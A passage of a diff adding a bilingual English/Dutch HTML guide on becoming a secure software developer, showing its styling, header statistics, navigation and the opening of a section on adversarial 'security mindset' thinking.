@@ -1,0 +1,1314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Becoming a Secure Software Developer</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500;600&display=swap');
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0c10;--surface:#10141c;--surface2:#13171f;--border:#1e2535;--border2:#252d3d;
+  --accent:#00d4aa;--text:#e2e8f0;--muted:#64748b;--dim:#2a3347;
+  --c-mind:#f472b6;--c-know:#3b82f6;--c-skill:#f59e0b;
+  --c-proc:#a78bfa;--c-tool:#34d399;--c-grow:#fb923c;
+}
+body{background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,212,170,.022) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,170,.022) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
+.wrap{max-width:1160px;margin:0 auto;padding:52px 24px 110px;position:relative;z-index:1}
+
+/* HEADER */
+.header{margin-bottom:50px}
+.eyebrow{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+.eyebrow::before{content:'';width:28px;height:1px;background:var(--accent)}
+.eyebrow span{font-family:'DM Mono',monospace;font-size:11px;letter-spacing:.22em;color:var(--accent);text-transform:uppercase}
+h1{font-family:'Syne',sans-serif;font-size:clamp(30px,5vw,54px);font-weight:800;line-height:1.06;letter-spacing:-.025em;margin-bottom:22px}
+h1 em{font-style:normal;color:var(--accent)}
+.header-grid{display:grid;grid-template-columns:1fr 380px;gap:32px;align-items:start}
+@media(max-width:760px){.header-grid{grid-template-columns:1fr}}
+.header-desc{font-size:14px;color:var(--muted);line-height:1.85;font-weight:300}
+.header-desc strong{color:var(--text);font-weight:500}
+.stats{display:flex;flex-direction:column;gap:10px}
+.stat{display:flex;gap:14px;align-items:flex-start;padding:12px 16px;background:var(--surface);border:1px solid var(--border);border-radius:9px}
+.stat-icon{font-size:18px;flex-shrink:0;margin-top:1px}
+.stat-body strong{display:block;font-size:13px;font-weight:600;color:var(--text);margin-bottom:2px}
+.stat-body span{font-size:12px;color:var(--muted);line-height:1.5}
+
+/* JOURNEY STRIP */
+.journey{display:flex;background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:44px}
+.jstep{flex:1;padding:13px 8px 11px;text-align:center;border-right:1px solid var(--border);position:relative;cursor:default}
+.jstep:last-child{border-right:none}
+.jstep::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:var(--jc);transform:scaleX(0);transition:transform .4s}
+.jstep.on::after{transform:scaleX(1)}
+.jstep.on{background:color-mix(in srgb,var(--jc) 5%,var(--surface))}
+.jn{font-family:'DM Mono',monospace;font-size:10px;color:var(--jc);opacity:.75;letter-spacing:.1em;margin-bottom:4px}
+.jl{font-family:'Syne',sans-serif;font-size:11px;font-weight:700;color:var(--text);line-height:1.3}
+.jstep.on .jl{color:var(--jc)}
+
+/* NAV */
+.nav{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:40px}
+@media(max-width:680px){.nav{grid-template-columns:repeat(2,1fr)}}
+.nb{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px 14px 13px;cursor:pointer;text-align:left;transition:all .2s;position:relative;overflow:hidden}
+.nb::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:var(--pc);transform:scaleX(0);transition:transform .2s;transform-origin:left}
+.nb:hover::after,.nb.on::after{transform:scaleX(1)}
+.nb:hover{border-color:color-mix(in srgb,var(--pc) 40%,transparent)}
+.nb.on{background:color-mix(in srgb,var(--pc) 8%,var(--surface));border-color:color-mix(in srgb,var(--pc) 45%,transparent)}
+.nb-num{font-family:'DM Mono',monospace;font-size:10px;letter-spacing:.1em;color:var(--pc);margin-bottom:5px;opacity:.8}
+.nb-title{font-family:'Syne',sans-serif;font-size:13px;font-weight:700;color:var(--text);line-height:1.3;margin-bottom:3px}
+.nb-sub{font-family:'DM Mono',monospace;font-size:10px;color:var(--muted)}
+.nb.on .nb-title{color:var(--pc)}
+.c-mind{--pc:var(--c-mind)}.c-know{--pc:var(--c-know)}.c-skill{--pc:var(--c-skill)}
+.c-proc{--pc:var(--c-proc)}.c-tool{--pc:var(--c-tool)}.c-grow{--pc:var(--c-grow)}
+
+/* PANELS */
+.panel{display:none}
+.panel.on{display:block;animation:fadeUp .3s ease}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* PANEL HEADER */
+.ph{padding:32px;background:var(--surface);border:1px solid var(--border);border-radius:14px;margin-bottom:28px;position:relative;overflow:hidden}
+.ph::before{content:'';position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,var(--pc),transparent)}
+.ph::after{content:attr(data-bg);position:absolute;right:22px;top:50%;transform:translateY(-50%);font-family:'Syne',sans-serif;font-size:68px;font-weight:800;color:var(--pc);opacity:.05;letter-spacing:-.04em;pointer-events:none;line-height:1}
+.ph-tag{font-family:'DM Mono',monospace;font-size:10px;letter-spacing:.18em;color:var(--pc);text-transform:uppercase;margin-bottom:10px}
+.ph h2{font-family:'Syne',sans-serif;font-size:clamp(20px,3vw,26px);font-weight:800;line-height:1.15;margin-bottom:12px}
+.ph p{font-size:13.5px;color:var(--muted);line-height:1.82;max-width:720px}
+.ph p strong{color:var(--text);font-weight:500}
+.ph-pills{display:flex;gap:8px;margin-top:18px;flex-wrap:wrap}
+.ph-pill{font-family:'DM Mono',monospace;font-size:10px;letter-spacing:.08em;padding:3px 10px;border-radius:20px;background:color-mix(in srgb,var(--pc) 12%,transparent);color:var(--pc);border:1px solid color-mix(in srgb,var(--pc) 25%,transparent);text-transform:uppercase}
+
+/* SEC TITLE */
+.sec{font-family:'DM Mono',monospace;font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--muted);margin:0 0 16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+
+/* GRID */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:16px;margin-bottom:30px}
+.grid2{grid-template-columns:repeat(auto-fill,minmax(280px,1fr))}
+.grid-full{grid-template-columns:1fr}
+
+/* CARD */
+.card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;display:flex;flex-direction:column;transition:all .22s}
+.card:hover{transform:translateY(-3px);border-color:color-mix(in srgb,var(--pc) 35%,transparent);box-shadow:0 8px 28px color-mix(in srgb,var(--pc) 8%,transparent)}
+.ct{padding:20px 20px 0}
+.ch{display:flex;align-items:flex-start;gap:12px;margin-bottom:11px}
+.ci{width:40px;height:40px;border-radius:9px;background:color-mix(in srgb,var(--pc) 10%,transparent);border:1px solid color-mix(in srgb,var(--pc) 20%,transparent);display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0}
+.cn{font-family:'Syne',sans-serif;font-size:15px;font-weight:700;color:var(--pc);margin-bottom:2px;line-height:1.2}
+.cs{font-family:'DM Mono',monospace;font-size:10px;color:var(--muted)}
+.cd{font-size:13px;color:var(--muted);line-height:1.75;margin-bottom:13px}
+.cd strong{color:var(--text);font-weight:500}
+
+/* LEVEL BADGE */
+.lv{display:inline-block;font-family:'DM Mono',monospace;font-size:9px;letter-spacing:.1em;padding:2px 8px;border-radius:3px;text-transform:uppercase;margin-bottom:10px}
+.lv1{background:color-mix(in srgb,#3b82f6 12%,transparent);color:#79c0ff;border:1px solid color-mix(in srgb,#3b82f6 25%,transparent)}
+.lv2{background:color-mix(in srgb,#f59e0b 12%,transparent);color:#e3b341;border:1px solid color-mix(in srgb,#f59e0b 25%,transparent)}
+.lv3{background:color-mix(in srgb,#ef4444 12%,transparent);color:#ff7b72;border:1px solid color-mix(in srgb,#ef4444 25%,transparent)}
+
+/* CODE BLOCK */
+.codeblock{margin:0 0 14px;background:#0d1117;border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.cb-bar{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:.12em;text-transform:uppercase;padding:6px 12px;background:rgba(255,255,255,.03);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;color:var(--muted)}
+.cb-title{color:var(--pc)}.cb-bad{color:#ef4444}.cb-good{color:#3fb950}.cb-lang{margin-left:auto}
+pre{padding:12px 14px;font-family:'DM Mono',monospace;font-size:11.5px;line-height:1.72;color:#c9d1d9;overflow-x:auto;white-space:pre}
+.r{color:#ff7b72}.g{color:#3fb950}.y{color:#e3b341}.b{color:#79c0ff}.p{color:#d2a8ff}.m{color:#8b949e}.c{color:#00d4aa}
+
+/* CHECKLIST */
+.cklist{padding:0 20px 14px;display:flex;flex-direction:column;gap:5px}
+.cki{display:flex;gap:8px;align-items:flex-start;font-size:12.5px;color:var(--muted);line-height:1.5}
+.cki .dot{width:17px;height:17px;border-radius:4px;background:color-mix(in srgb,var(--pc) 12%,transparent);border:1px solid color-mix(in srgb,var(--pc) 22%,transparent);display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;font-size:9px;color:var(--pc);font-family:'DM Mono',monospace}
+.cki strong{color:var(--text);font-weight:500}
+
+/* KEY POINTS */
+.kp{padding:13px 20px;background:color-mix(in srgb,var(--pc) 4%,var(--surface2));border-top:1px solid var(--border);flex:1}
+.kp-title{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:var(--pc);margin-bottom:8px;opacity:.7}
+.kp-items{display:flex;flex-direction:column;gap:4px}
+.kp-item{display:flex;gap:7px;align-items:flex-start;font-size:12px;color:var(--muted);line-height:1.5}
+.kp-item::before{content:'→';color:var(--pc);font-size:11px;flex-shrink:0;margin-top:1px;opacity:.55}
+.kp-item strong{color:var(--text);font-weight:500}
+
+/* ANTI-PATTERN */
+.anti{padding:12px 20px;background:color-mix(in srgb,#ef4444 4%,var(--surface2));border-top:1px solid var(--border)}
+.anti-title{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:#ef4444;margin-bottom:7px;opacity:.7}
+.anti-item{display:flex;gap:7px;align-items:flex-start;font-size:12px;color:var(--muted);line-height:1.5;margin-bottom:4px}
+.anti-item::before{content:'✗';color:#ef4444;font-size:11px;flex-shrink:0;margin-top:1px;opacity:.65}
+
+/* RESOURCES */
+.res{padding:12px 20px 16px;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:5px}
+.res-label{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);margin-bottom:3px;opacity:.45}
+.rl{display:flex;align-items:center;gap:7px;text-decoration:none;padding:5px 8px;border-radius:5px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);transition:all .18s}
+.rl:hover{background:rgba(255,255,255,.06);transform:translateX(2px)}
+.rl .ri{font-size:12px;flex-shrink:0;opacity:.6}
+.rl .rt{font-size:11.5px;color:var(--text);opacity:.6;flex:1;transition:all .15s}
+.rl:hover .rt{opacity:1;color:var(--pc)}
+.rl .ra{font-size:10px;opacity:.2;transition:all .15s}
+.rl:hover .ra{opacity:.6;transform:translateX(2px)}
+
+/* COMPARISON */
+.cmp{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:28px}
+@media(max-width:600px){.cmp{grid-template-columns:1fr}}
+.cmp-box{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px}
+.cmp-label{font-family:'DM Mono',monospace;font-size:10px;letter-spacing:.12em;text-transform:uppercase;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+.cmp-label.bad{color:#ef4444}.cmp-label.ok{color:var(--accent)}
+.cmp-item{display:flex;gap:8px;align-items:flex-start;font-size:12.5px;color:var(--muted);margin-bottom:7px;line-height:1.55}
+.cmp-item::before{font-size:11px;flex-shrink:0;margin-top:1px}
+.cmp-item.bad::before{content:'✗';color:#ef4444;opacity:.7}
+.cmp-item.ok::before{content:'✓';color:var(--accent);opacity:.7}
+.cmp-item strong{color:var(--text);font-weight:500}
+
+/* FLOW BOX */
+.flow-box{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:22px;margin-bottom:24px}
+.flow-box h3{font-family:'Syne',sans-serif;font-size:14px;font-weight:700;color:var(--pc);margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.fs{display:flex;gap:16px;align-items:flex-start;padding:12px 0;border-bottom:1px solid color-mix(in srgb,var(--border) 40%,transparent)}
+.fs:last-child{border-bottom:none}
+.fn{font-family:'DM Mono',monospace;font-size:11px;color:var(--pc);background:color-mix(in srgb,var(--pc) 12%,transparent);width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-weight:500}
+.fb h4{font-family:'Syne',sans-serif;font-size:13px;font-weight:700;color:var(--text);margin-bottom:3px}
+.fb p{font-size:12.5px;color:var(--muted);line-height:1.65}
+.fb code{font-family:'DM Mono',monospace;font-size:11px;background:rgba(255,255,255,.05);padding:1px 5px;border-radius:3px;color:var(--pc)}
+
+/* STRIP */
+.strip{display:flex;align-items:flex-start;gap:14px;padding:14px 18px;border-radius:10px;margin-bottom:22px}
+.strip.warn{background:color-mix(in srgb,#f59e0b 6%,transparent);border:1px solid color-mix(in srgb,#f59e0b 22%,transparent)}
+.strip.info{background:color-mix(in srgb,#3b82f6 6%,transparent);border:1px solid color-mix(in srgb,#3b82f6 22%,transparent)}
+.strip.ok{background:color-mix(in srgb,var(--accent) 6%,transparent);border:1px solid color-mix(in srgb,var(--accent) 22%,transparent)}
+.strip.hot{background:color-mix(in srgb,#f472b6 6%,transparent);border:1px solid color-mix(in srgb,#f472b6 22%,transparent)}
+.strip .si{font-size:16px;flex-shrink:0;margin-top:1px}
+.strip .st{font-size:12.5px;color:var(--text);opacity:.85;line-height:1.7}
+.strip .st strong{font-weight:500}
+.strip.warn .st strong{color:#f59e0b}
+.strip.info .st strong{color:#79c0ff}
+.strip.ok   .st strong{color:var(--accent)}
+.strip.hot  .st strong{color:#f472b6}
+
+/* MATRIX TABLE */
+.matrix{width:100%;border-collapse:collapse;background:var(--surface);border-radius:12px;overflow:hidden;border:1px solid var(--border);margin-bottom:28px;font-size:12px}
+.matrix th{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);padding:10px 14px;text-align:left;background:rgba(255,255,255,.02);border-bottom:1px solid var(--border)}
+.matrix td{padding:9px 14px;border-bottom:1px solid color-mix(in srgb,var(--border) 50%,transparent);color:var(--muted);vertical-align:top;line-height:1.5}
+.matrix tr:last-child td{border-bottom:none}
+.matrix td:first-child{color:var(--text);font-weight:500;font-size:12.5px}
+.l1c{color:#79c0ff}.l2c{color:#e3b341}.l3c{color:#f472b6}
+.tag-y{color:#3fb950;font-size:11px}.tag-n{color:#ef4444;font-size:11px}
+
+/* TOOLBOX */
+.toolbox{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px 24px;margin-top:28px}
+.toolbox h3{font-family:'Syne',sans-serif;font-size:14px;font-weight:700;color:var(--pc);margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.tool-row{display:flex;flex-wrap:wrap;gap:8px}
+.tp{font-family:'DM Mono',monospace;font-size:11px;padding:5px 12px;background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:20px;color:var(--text);opacity:.7;transition:all .15s;text-decoration:none;display:inline-block}
+.tp:hover{opacity:1;border-color:var(--pc);color:var(--pc)}
+
+/* SKILL BARS (interactive) */
+.radar{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:28px}
+.radar h3{font-family:'Syne',sans-serif;font-size:15px;font-weight:700;color:var(--pc);margin-bottom:6px}
+.radar .rdesc{font-size:12.5px;color:var(--muted);line-height:1.6;margin-bottom:20px}
+.sb-row{display:flex;align-items:center;gap:14px;margin-bottom:10px}
+.sb-label{font-size:12.5px;color:var(--muted);min-width:180px;flex-shrink:0}
+.sb-cat{font-family:'DM Mono',monospace;font-size:9px;color:var(--muted);opacity:.5;min-width:50px;flex-shrink:0}
+.sb-track{flex:1;height:7px;background:var(--border2);border-radius:4px;overflow:visible;cursor:pointer;position:relative}
+.sb-fill{height:100%;border-radius:4px;transition:width .3s ease;width:0%}
+.sb-val{font-family:'DM Mono',monospace;font-size:10px;color:var(--muted);min-width:90px;text-align:right;opacity:.6;transition:all .2s}
+
+/* ROADMAP */
+.roadmap{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px;margin-bottom:28px}
+.rm-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px;position:relative;overflow:hidden}
+.rm-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:var(--pc)}
+.rm-phase{font-family:'DM Mono',monospace;font-size:10px;color:var(--pc);letter-spacing:.1em;margin-bottom:8px;text-transform:uppercase}
+.rm-title{font-family:'Syne',sans-serif;font-size:14px;font-weight:700;color:var(--text);margin-bottom:8px}
+.rm-items{display:flex;flex-direction:column;gap:4px}
+.rm-item{font-size:12px;color:var(--muted);display:flex;gap:7px;align-items:flex-start;line-height:1.5}
+.rm-item::before{content:'→';color:var(--pc);font-size:10px;flex-shrink:0;margin-top:2px;opacity:.55}
+.rm-item strong{color:var(--text);font-weight:500}
+
+/* CERT TABLE */
+.cert-table{width:100%;border-collapse:collapse;background:var(--surface);border-radius:12px;overflow:hidden;border:1px solid var(--border);margin-bottom:28px;font-size:12px}
+.cert-table th{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);padding:10px 14px;text-align:left;background:rgba(255,255,255,.02);border-bottom:1px solid var(--border)}
+.cert-table td{padding:9px 14px;border-bottom:1px solid color-mix(in srgb,var(--border) 50%,transparent);color:var(--muted);vertical-align:top;line-height:1.5}
+.cert-table tr:last-child td{border-bottom:none}
+.cert-table td:first-child{color:var(--text);font-weight:500}
+.free{color:#3fb950;font-size:11px;font-family:'DM Mono',monospace}
+.paid{color:#f59e0b;font-size:11px;font-family:'DM Mono',monospace}
+
+/* EXAMPLES */
+.examples{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px;margin-bottom:28px}
+.ex{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px;transition:border-color .2s}
+.ex:hover{border-color:color-mix(in srgb,var(--pc) 30%,transparent)}
+.ex-hdr{display:flex;align-items:center;gap:10px;margin-bottom:9px}
+.ex-tag{font-family:'DM Mono',monospace;font-size:10px;padding:2px 8px;border-radius:3px;background:color-mix(in srgb,var(--pc) 12%,transparent);color:var(--pc);flex-shrink:0}
+.ex-name{font-family:'Syne',sans-serif;font-size:13px;font-weight:700;color:var(--text)}
+.ex-desc{font-size:12.5px;color:var(--muted);line-height:1.65}
+
+.back-link { position: absolute; top: 24px; right: 24px; font-family: 'DM Mono', monospace; font-size: 11px; color: var(--muted); text-decoration: none; transition: color 0.2s; }
+.back-link:hover { color: var(--text); }
+
+/* ── Language Switcher ── */
+.lang-switch { position: absolute; top: 24px; right: 140px; display: flex; gap: 8px; z-index: 10; }
+.lang-btn { background: transparent; border: 1px solid var(--border); color: var(--muted); padding: 4px 8px; border-radius: 4px; cursor: pointer; font-family: 'DM Mono', monospace; font-size: 11px; transition: all 0.2s; }
+.lang-btn:hover { color: var(--text); border-color: var(--muted); }
+.lang-btn.active { border-color: var(--accent); color: var(--accent); background: color-mix(in srgb, var(--accent) 10%, transparent); }
+
+body.lang-nl [data-lang="en"] { display: none !important; }
+body.lang-en [data-lang="nl"] { display: none !important; }
+</style>
+</head>
+<body class="lang-en">
+<div class="wrap">
+  <a href="index.html" class="back-link">← Back to Hub</a>
+
+  <div class="lang-switch">
+    <button class="lang-btn" onclick="setLang('nl')">NL</button>
+    <button class="lang-btn active" onclick="setLang('en')">EN</button>
+  </div>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="eyebrow"><span data-lang="en">Developer Roadmap · Series 4</span><span data-lang="nl">Developer Roadmap · Serie 4</span></div>
+  <h1><span data-lang="en">Becoming a <em>Secure</em><br>Software Developer</span><span data-lang="nl">Een <em>Veilige</em><br>Software Developer Worden</span></h1>
+  <div class="header-grid">
+    <div class="header-desc">
+      <span data-lang="en">Security is not a separate discipline bolted on after the fact — it is <strong>a way of thinking woven into every step of how you build software</strong>. This guide maps the complete journey from a regular developer to one who writes secure software by design: the mindset shift, the knowledge base, the practical coding skills, the security activities in your process, the tools, and how to keep growing. Based on <strong>OWASP SAMM, NIST SSDF SP 800-218, Microsoft SDL, SEI CMU, and practitioner consensus</strong>.</span>
+      <span data-lang="nl">Beveiliging is geen aparte discipline die achteraf wordt toegevoegd — het is <strong>een manier van denken verweven in elke stap van hoe je software bouwt</strong>. Deze gids brengt de volledige reis in kaart van een gewone ontwikkelaar naar iemand die veilige software by design schrijft: de mindset-verandering, de kennisbasis, de praktische codeervaardigheden, de beveiligingsactiviteiten in je proces, de tools en hoe je blijft groeien. Gebaseerd op <strong>OWASP SAMM, NIST SSDF SP 800-218, Microsoft SDL, SEI CMU en consensus onder experts</strong>.</span>
+    </div>
+    <div class="stats">
+      <div class="stat">
+        <span class="stat-icon">💸</span>
+        <div class="stat-body"><strong data-lang="en">30× cheaper to fix in design than production</strong><strong data-lang="nl">30× goedkoper in ontwerp dan productie</strong><span data-lang="en">IBM research: fixing a bug in design costs 1×, in production 30–100×. Security = economics.</span><span data-lang="nl">IBM-onderzoek: een bug in ontwerp fixen kost 1×, in productie 30–100×. Security = economie.</span></div>
+      </div>
+      <div class="stat">
+        <span class="stat-icon">🎯</span>
+        <div class="stat-body"><strong>OWASP A01 — Broken Access Control</strong><span data-lang="en">#1 vulnerability for 3 consecutive years. Most breaches are basic design failures, not exotic exploits.</span><span data-lang="nl">#1 kwetsbaarheid voor 3 opeenvolgende jaren. Meeste inbreuken zijn simpele ontwerpfouten, geen exotische exploits.</span></div>
+      </div>
+      <div class="stat">
+        <span class="stat-icon">🏆</span>
+        <div class="stat-body"><strong data-lang="en">Security Champions reduce vulns 50%+</strong><strong data-lang="nl">Security Champions verminderen kwetsbaarheden 50%+</strong><span data-lang="en">Teams that invest in developer security skills ship measurably more secure software.</span><span data-lang="nl">Teams die investeren in security-skills van developers leveren meetbaar veiligere software.</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- JOURNEY BAR -->
+<div class="journey">
+  <div class="jstep on" style="--jc:var(--c-mind)"><div class="jn">01</div><div class="jl"><span data-lang="en">Security Mindset</span><span data-lang="nl">Security Mindset</span></div></div>
+  <div class="jstep on" style="--jc:var(--c-know)"><div class="jn">02</div><div class="jl"><span data-lang="en">Core Knowledge</span><span data-lang="nl">Basiskennis</span></div></div>
+  <div class="jstep on" style="--jc:var(--c-skill)"><div class="jn">03</div><div class="jl"><span data-lang="en">Secure Coding</span><span data-lang="nl">Veilig Coderen</span></div></div>
+  <div class="jstep on" style="--jc:var(--c-proc)"><div class="jn">04</div><div class="jl"><span data-lang="en">Security in Process</span><span data-lang="nl">Security in Proces</span></div></div>
+  <div class="jstep on" style="--jc:var(--c-tool)"><div class="jn">05</div><div class="jl"><span data-lang="en">Tools & Testing</span><span data-lang="nl">Tools & Testen</span></div></div>
+  <div class="jstep on" style="--jc:var(--c-grow)"><div class="jn">06</div><div class="jl"><span data-lang="en">Growth & Culture</span><span data-lang="nl">Groei & Cultuur</span></div></div>
+</div>
+
+<!-- NAV -->
+<div class="nav">
+  <button class="nb c-mind on" onclick="go(0)">
+    <div class="nb-num">01 · Foundation</div>
+    <div class="nb-title"><span data-lang="en">Security Mindset</span><span data-lang="nl">Security Mindset</span></div>
+    <div class="nb-sub"><span data-lang="en">Attacker thinking, ownership, assumptions</span><span data-lang="nl">Aanvallersdenken, eigenaarschap, aannames</span></div>
+  </button>
+  <button class="nb c-know" onclick="go(1)">
+    <div class="nb-num">02 · Knowledge</div>
+    <div class="nb-title"><span data-lang="en">What You Must Know</span><span data-lang="nl">Wat Je Moet Weten</span></div>
+    <div class="nb-sub"><span data-lang="en">OWASP Top 10, crypto, auth, threat modeling</span><span data-lang="nl">OWASP Top 10, crypto, auth, threat modeling</span></div>
+  </button>
+  <button class="nb c-skill" onclick="go(2)">
+    <div class="nb-num">03 · Skills</div>
+    <div class="nb-title"><span data-lang="en">Secure Coding Skills</span><span data-lang="nl">Veilige Codeervaardigheden</span></div>
+    <div class="nb-sub"><span data-lang="en">Input, output, API, secrets, dependencies</span><span data-lang="nl">Input, output, API, secrets, dependencies</span></div>
+  </button>
+  <button class="nb c-proc" onclick="go(3)">
+    <div class="nb-num">04 · Process</div>
+    <div class="nb-title"><span data-lang="en">Security in Your SDLC</span><span data-lang="nl">Security in Je SDLC</span></div>
+    <div class="nb-sub"><span data-lang="en">Requirements, design, review, testing, ops</span><span data-lang="nl">Requirements, ontwerp, review, testen, ops</span></div>
+  </button>
+  <button class="nb c-tool" onclick="go(4)">
+    <div class="nb-num">05 · Tooling</div>
+    <div class="nb-title"><span data-lang="en">DevSecOps Tooling</span><span data-lang="nl">DevSecOps Tooling</span></div>
+    <div class="nb-sub"><span data-lang="en">SAST, DAST, SCA, secrets, containers, IaC</span><span data-lang="nl">SAST, DAST, SCA, secrets, containers, IaC</span></div>
+  </button>
+  <button class="nb c-grow" onclick="go(5)">
+    <div class="nb-num">06 · Growth</div>
+    <div class="nb-title"><span data-lang="en">Culture & Continuous Growth</span><span data-lang="nl">Cultuur & Continue Groei</span></div>
+    <div class="nb-sub"><span data-lang="en">Champions, learning path, self-assessment</span><span data-lang="nl">Champions, leerpad, zelfevaluatie</span></div>
+  </button>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PANEL 1 — SECURITY MINDSET                    -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="panel c-mind on" id="p0">
+  <div class="ph c-mind" data-bg="MIND">
+    <div class="ph-tag">01 · The Foundation</div>
+    <h2><span data-lang="en">The Security Mindset</span><span data-lang="nl">De Security Mindset</span></h2>
+    <p data-lang="en">The single most important shift is not learning a new tool — it is <strong>learning to think about your own code from an adversarial perspective</strong>. A regular developer asks "does this work correctly?" A secure developer also asks "how could this be abused?" This question — asked habitually, at design time — prevents more vulnerabilities than any scanner or review.</p>
+    <p data-lang="nl">De belangrijkste verschuiving is niet het leren van een nieuwe tool — het is <strong>leren nadenken over je eigen code vanuit een vijandig perspectief</strong>. Een gewone ontwikkelaar vraagt "werkt dit correct?" Een veilige ontwikkelaar vraagt ook "hoe kan dit misbruikt worden?" Deze vraag — routinematig gesteld tijdens het ontwerp — voorkomt meer kwetsbaarheden dan welke scanner of review dan ook.</p>
+    <div class="ph-pills">
+      <span class="ph-pill" data-lang="en">Adversarial thinking</span><span class="ph-pill" data-lang="nl">Vijandig denken</span>
+      <span class="ph-pill" data-lang="en">Assume breach</span><span class="ph-pill" data-lang="nl">Ga uit van een inbreuk</span>
+      <span class="ph-pill" data-lang="en">Question assumptions</span><span class="ph-pill" data-lang="nl">Bevraag aannames</span>
+      <span class="ph-pill" data-lang="en">Ownership</span><span class="ph-pill" data-lang="nl">Eigenaarschap</span>
+      <span class="ph-pill" data-lang="en">Shift left</span><span class="ph-pill" data-lang="nl">Shift left</span>
+    </div>
+  </div>
+
+  <div class="cmp">
+    <div class="cmp-box">
+      <div class="cmp-label bad"><span data-lang="en">⚠ Regular Developer Mindset</span><span data-lang="nl">⚠ Gewone Developer Mindset</span></div>
+      <div class="cmp-item bad"><span data-lang="en">"Does this feature work for valid users?"</span><span data-lang="nl">"Werkt deze functie voor geldige gebruikers?"</span></div>
+      <div class="cmp-item bad"><span data-lang="en">"The front-end validates input — that's enough"</span><span data-lang="nl">"De front-end valideert input — dat is genoeg"</span></div>
+      <div class="cmp-item bad"><span data-lang="en">"Security is the security team's responsibility"</span><span data-lang="nl">"Security is de verantwoordelijkheid van het security-team"</span></div>
+      <div class="cmp-item bad"><span data-lang="en">"Nobody will guess that internal URL"</span><span data-lang="nl">"Niemand raadt die interne URL"</span></div>
+    </div>
+    <div class="cmp-box">
+      <div class="cmp-label ok"><span data-lang="en">✓ Secure Developer Mindset</span><span data-lang="nl">✓ Veilige Developer Mindset</span></div>
+      <div class="cmp-item ok"><span data-lang="en">"How could a malicious user <strong>abuse</strong> this feature?"</span><span data-lang="nl">"Hoe kan een kwaadwillende gebruiker dit <strong>misbruiken</strong>?"</span></div>
+      <div class="cmp-item ok"><span data-lang="en">"Client-side validation is UX — I <strong>always</strong> validate server-side"</span><span data-lang="nl">"Client-side validatie is UX — ik valideer <strong>altijd</strong> server-side"</span></div>
+      <div class="cmp-item ok"><span data-lang="en">"I own the security of the code <strong>I</strong> write"</span><span data-lang="nl">"Ik ben eigenaar van de veiligheid van de code die <strong>ik</strong> schrijf"</span></div>
+      <div class="cmp-item ok"><span data-lang="en">"Assume attackers find every URL — <strong>require auth regardless</strong>"</span><span data-lang="nl">"Ga ervan uit dat aanvallers elke URL vinden — <strong>vereis altijd auth</strong>"</span></div>
+    </div>
+  </div>
+
+  <div class="sec"><span data-lang="en">Core Mindset Principles</span><span data-lang="nl">Kernprincipes van de Mindset</span></div>
+  <div class="grid">
+
+    <div class="card c-mind">
+      <div class="ct">
+        <div class="ch"><div class="ci">🎭</div><div><div class="cn"><span data-lang="en">Think Like an Attacker</span><span data-lang="nl">Denk als een Aanvaller</span></div><div class="cs"><span data-lang="en">Adversarial mindset · Abuse cases · STRIDE</span><span data-lang="nl">Vijandige mindset · Abuse cases · STRIDE</span></div></div></div>
